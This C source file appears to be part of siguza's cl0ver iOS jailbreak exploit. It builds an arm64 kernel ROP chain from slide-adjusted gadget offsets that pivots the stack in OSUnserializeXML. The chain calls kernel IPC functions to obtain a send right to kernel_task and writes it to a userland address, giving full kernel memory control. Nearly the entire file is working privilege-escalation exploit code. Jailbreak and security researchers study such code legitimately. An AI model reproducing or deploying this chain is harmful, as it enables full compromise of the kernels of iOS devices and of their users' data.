// siguza's cl0ver

#include <common.h>
#include <io.h>
#include <kslide.h>
#include <plog.h>
#include <offsets.h>
#include <uaf.h>

#define PUSH(head, val) \
do \
{ \
(head)[0] = (val); \
head = &(head)[1]; \
} while(0)

void build_rop_chain(addr_t **chain, task_t *task)
{    
    {
        const uint64_t add_sp              = get_kernel_slide() + koffset(gadget_ldp_x9_add_sp_sp_0x10);
        const uint64_t ldr                 = get_kernel_slide() + koffset(gadget_ldr_x0_sp_0x20_load_x22_x19);
        const uint64_t add_x0              = get_kernel_slide() + koffset(gadget_add_x0_x0_x19_load_x20_x19);
        const uint64_t str                 = get_kernel_slide() + koffset(gadget_str_x0_x19_load_x20_x19);
        const uint64_t stack_OSUnserialize = koffset(OSUnserializeXML_stack);
        const uint64_t stack_open_extended = koffset(is_io_service_open_extended_stack);
        
        if(stack_OSUnserialize % 0x10 != 0)
        {
            ERR("Cannot build ROP chain: OSUnserializeXML's stack size is not a multiple of 0x10!");
            return;
        }
        
        uint64_t remaining_stack_size = stack_OSUnserialize;
        // x29 is at 0x10 before the end of the stack frame
        remaining_stack_size -= 0x10;
        // Stack pivot does sp += 0x10
        remaining_stack_size -= 0x10;
        // And our load gadget loads from [sp, 0x20]
        remaining_stack_size -= 0x20;
        // We have to add the remaining size to sp, to reach the address where x29 is stored
        for(uint32_t i = 0; i < remaining_stack_size / 0x10; ++i)
        {
            // sp += 0x10
            PUSH(*chain, (uint64_t)&(*chain)[2]); // x29
            PUSH(*chain, add_sp);                 // x30
        }
        // ldr x0, [sp, 0x20] and set x19 = -0x120
        PUSH(*chain, (uint64_t)&(*chain)[6]);     // x29
        PUSH(*chain, ldr);                        // x30
        PUSH(*chain, 0);                          // x22
        PUSH(*chain, 0);                          // x21
        PUSH(*chain, 0);                          // x20
        PUSH(*chain, -stack_open_extended);       // x19
        // x0 += x19 and load storage address
        PUSH(*chain, (uint64_t)&(*chain)[4]);        // x29
        PUSH(*chain, add_x0);                        // x30
        PUSH(*chain, 0);                             // x20
        PUSH(*chain, (uint64_t)&(*chain)[67]);       // x19 >----------------------------------------------------------,
        // str x0, addr                                                                                                |
        PUSH(*chain, (uint64_t)&(*chain)[4]);        // x29                                                            |
        PUSH(*chain, str);                           // x30                                                            |
        PUSH(*chain, 0);                             // x20                                                            |
        PUSH(*chain, 0);                             // x19                                                            |
    }                                                                                                               // |
                                                                                                                    // |
    // Get kernel task                                                                                                 |
    {                                                                                                               // |
        // *task = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), current_task()->itk_space);     // |
        const uint64_t current_task          = get_kernel_slide() + koffset(func_current_task);                     // |
        const uint64_t ipc_port_make_send    = get_kernel_slide() + koffset(func_ipc_port_make_send);               // |
        const uint64_t ipc_port_copyout_send = get_kernel_slide() + koffset(func_ipc_port_copyout_send);            // |
        const uint64_t ldr_x0                = get_kernel_slide() + koffset(func_ldr_x0_x0);                        // |
        const uint64_t load                  = get_kernel_slide() + koffset(gadget_load_x20_x19);                   // |
        const uint64_t call                  = get_kernel_slide() + koffset(gadget_blr_x20_load_x22_x19);           // |
        const uint64_t add                   = get_kernel_slide() + koffset(gadget_add_x0_x0_x19_load_x20_x19);     // |
        const uint64_t str                   = get_kernel_slide() + koffset(gadget_str_x0_x19_load_x20_x19);        // |
        const uint64_t ldr_x21               = get_kernel_slide() + koffset(gadget_ldr_x0_x21_0x5c8_load_x24_x19);  // |
        const uint64_t mov                   = get_kernel_slide() + koffset(frag_mov_x1_x20_blr_x21);               // |
        const uint64_t kernel_task           = get_kernel_slide() + koffset(data_kernel_task);//  ,--------------------`
        const uint64_t off_ipc_space         = koffset(task_itk_space);                       //  |
        const uint64_t off_itk_self          = koffset(task_itk_self);                        //  |
        // load address of current_task                                                           |
        PUSH(*chain, (uint64_t)&(*chain)[4]);     // x29                                          |
        PUSH(*chain, load);                       // x30                                          |
        PUSH(*chain, current_task);               // x20                                          |
        PUSH(*chain, 0);                          // x19                                          |
        // call current_task and load arg to adding gadget                                        |
        PUSH(*chain, (uint64_t)&(*chain)[6]);     // x29                                          |
        PUSH(*chain, call);                       // x30                                          |
        PUSH(*chain, 0);                          // x22                                          |
        PUSH(*chain, 0);                          // x21                                          |
        PUSH(*chain, 0);                          // x20                                          |
        PUSH(*chain, off_ipc_space);              // x19                                          |
        // simulate get_task_ipcspace (i.e. task->ipc_space) with x0 += 0x2a0...                  |
        PUSH(*chain, (uint64_t)&(*chain)[4]);     // x29                                          |
        PUSH(*chain, add);                        // x30                                          |
        PUSH(*chain, ldr_x0);                     // x20                                          |
        PUSH(*chain, 0);                          // x19                                          |
        // ...and x0 = [x0] (also load address for store and address of kernel_task)              |
        PUSH(*chain, (uint64_t)&(*chain)[6]);     // x29                                          |
        PUSH(*chain, call);                       // x30                                          |
        PUSH(*chain, 0);                          // x22                                          |
        PUSH(*chain, kernel_task - 0x5c8);        // x21  // x0 = *(x21 + 0x5c8);                 |
        PUSH(*chain, 0);                          // x20                                          |
        PUSH(*chain, (uint64_t)&(*chain)[27]);    // x19 >------------------------,               |
        // save x0 for later                                                      |               |
        PUSH(*chain, (uint64_t)&(*chain)[4]);     // x29                          |               |
        PUSH(*chain, str);                        // x30                          |               |
        PUSH(*chain, 0);                          // x20                          |               |
        PUSH(*chain, 0);                          // x19                          |               |
        // load kernel_task to x0 and load args to add gadget                     |               |
        PUSH(*chain, (uint64_t)&(*chain)[8]);     // x29                          |               |
        PUSH(*chain, ldr_x21);                    // x30                          |               |
        PUSH(*chain, 0);                          // x24                          |               |
        PUSH(*chain, 0);                          // x23                          |               |
        PUSH(*chain, 0);                          // x22                          |               |
        PUSH(*chain, 0);                          // x21                          |               |
        PUSH(*chain, 0);                          // x20                          |               |
        PUSH(*chain, off_itk_self);               // x19                          |               |
        // simulate &kernel_task->itk_self with kernel_task + 0xe8, and load address of ldr_x0 function
        PUSH(*chain, (uint64_t)&(*chain)[4]);     // x29                          |               |
        PUSH(*chain, add);                        // x30                          |               |
        PUSH(*chain, ldr_x0);                     // x20                          |               |
        PUSH(*chain, 0);                          // x19                          |               |
        // get kernel_task->itk_self and load address of ipc_port_make_send       |               |
        PUSH(*chain, (uint64_t)&(*chain)[6]);     // x29                          |               |
        PUSH(*chain, call);                       // x30                          |               |
        PUSH(*chain, 0);                          // x22                          |               |
        PUSH(*chain, 0);                          // x21                          |               |
        PUSH(*chain, ipc_port_make_send);         // x20                          |               |
        PUSH(*chain, 0);                          // x19                          |               |
        // call ipc_port_make_send and prepare to restore old x0 to x1            |               |
        PUSH(*chain, (uint64_t)&(*chain)[6]);     // x29                          |               |
        PUSH(*chain, call);                       // x30                          |               |
        PUSH(*chain, 0);                          // x22                          |               |
        PUSH(*chain, load);                       // x21                          |               |
        PUSH(*chain, 0xbaadf00d);                 // x20 <------------------------`               |
        PUSH(*chain, 0);                  // x19                                                  |
        // restore the x0 we saved earlier to x1                                                  |
        PUSH(*chain, (uint64_t)&(*chain)[8]);     // x29                                          |
        PUSH(*chain, mov);                        // x30                                          |
        // previous fragment will jump to load, here are its args                                 |
        PUSH(*chain, ipc_port_copyout_send);      // x20                                          |
        PUSH(*chain, 0);                          // x19                                          |
        // call ipc_port_copyout_send and load address to store                                   |
        PUSH(*chain, (uint64_t)&(*chain)[6]);     // x29                                          |
        PUSH(*chain, call);                       // x30                                          |
        PUSH(*chain, 0);                          // x22                                          |
        PUSH(*chain, 0);                          // x21                                          |
        PUSH(*chain, 0);                          // x20                                          |
        PUSH(*chain, (uint64_t)task);             // x19                                          |
        // store x0 to userland address                                                           |
        PUSH(*chain, (uint64_t)&(*chain)[4]);     // x29                                          |
        PUSH(*chain, str);                        // x30                                          |
        PUSH(*chain, 0);                          // x20                                          |
        PUSH(*chain, 0);                          // x19                                          |
    }                                                                                          // |
    // Restore stack frame... to some extent (TODO: fix memleaks & return value)                  |
    {                                                                                          // |
        const uint64_t ret_addr = get_kernel_slide() + koffset(gadget_OSUnserializeXML_return);// |
        // return                                                                                 |
        PUSH(*chain, 0xdeadbeef);                 // x29 <----------------------------------------`
        PUSH(*chain, ret_addr);                   // x30
    }
    
}
